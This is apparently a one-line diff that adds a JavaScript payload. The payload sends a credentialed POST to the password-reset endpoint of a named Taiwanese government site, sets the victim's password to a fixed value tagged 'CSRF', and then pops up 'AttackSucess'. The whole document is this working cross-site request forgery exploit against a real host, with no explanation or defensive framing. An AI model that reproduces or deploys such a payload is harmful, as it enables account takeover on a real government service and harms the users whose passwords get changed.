@@ -1,0 +1,1 @@
+var limitReq = new XMLHttpRequest();limitReq.open("POST", "https://ep-t.land.nat.gov.tw/O/SysManager/RePWDResult", false);limitReq.withCredentials = true;var params ="PWD=1qaz%40WSX3edcCSRF&NPWD=1qaz%40WSX3edcCSRF";limitReq.send(params);prompt("AttackSucess")
